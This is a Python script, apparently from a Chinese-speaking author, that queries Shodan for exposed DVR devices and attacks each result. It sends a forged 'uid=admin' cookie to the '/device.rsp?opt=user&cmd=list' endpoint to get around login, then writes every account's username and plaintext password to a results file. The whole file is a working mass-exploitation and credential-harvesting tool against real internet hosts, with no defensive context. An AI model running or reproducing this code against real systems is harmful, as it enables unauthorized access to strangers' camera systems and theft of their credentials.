# -*- coding: utf-8 -*-

import requests
import json
import shodan
import threading
import time
from methods2 import config

lock = threading.Lock()

class Dvr(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)

	def makeReqHeaders(self,host,xCookie):
		headers = {}
		headers["Host"] = host
		headers["User-Agent"] = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
		headers["Accept"]           = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
		headers["Accept-Languag"]   = "es-AR,en-US;q=0.7,en;q=0.3"
		headers["Connection"]       = "close"
		headers["Content-Type"]     = "text/html"
		headers["Cookie"]           = "uid="+xCookie
		return headers

	def findVuln(self,HST,port,final_data):
		fullHost_1  =   "http://"+HST+":"+str(port)+"/device.rsp?opt=user&cmd=list"
		host        =   "http://"+HST+":"+str(port)+"/"
		try:
			rX = requests.get(fullHost_1,headers=self.makeReqHeaders(host,xCookie="admin"),timeout=10.000)
		except Exception as e:
			return
		badJson = rX.text
		try:
			dataJson = json.loads(badJson)
			totUsr = len(dataJson["list"])
		except Exception as e:
			return
		try:
			for obj in range(0,totUsr):
				temp =[]
				_url = str(host)[0:-1]
				_usuario    = dataJson["list"][obj]["uid"]
				_password   = dataJson["list"][obj]["pwd"]
				temp.append(_url)
				temp.append(_usuario)
				temp.append(_password)
				final_data.append(temp)
		except Exception as e:
			return
		return

	def appendToFile(self,datas):
		global lock
		fileName = "results.txt"
		if lock.acquire():
			file = open(fileName,"a")
			for data in datas:
				for mData in data:
					file.write(mData)
					file.write(" ")
				file.writelines("\n")
			lock.release()
		print("查询记录输出在results.txt文件中，请查看")

	def scan(self,dic):
		final_data = []
		for host,port in dic.items():
			self.findVuln(host,port,final_data)
		self.appendToFile(final_data)

	def search(self):
		api = shodan.Shodan(SHODAN_API_KEY)
		dsts = {}
		try:
			# 搜索 Shodan
			results = api.search('login.rsp')
			# 显示结果
			print('Results found: %s' % results['total'])
			for result in results['matches']:
				dsts[result['ip_str']] = result['port']
		except shodan.APIError as e:
			print('Error: %s' % e)
		return dsts

	def run(self):
		if len(SHODAN_API_KEY)<2:
			print("请修改SHODAN_API_KEY")
			return
		dic = self.search()
		self.scan(dic)

#线程数量,试试证明改了没有什么用
THREAD_COUNT = 1
SHODAN_API_KEY = config.SHODAN_API_KEY

def main():
	for i in range(THREAD_COUNT):
		dvr = Dvr()
		dvr.start()
		time.sleep(2)


if __name__ == '__main__':
	main()


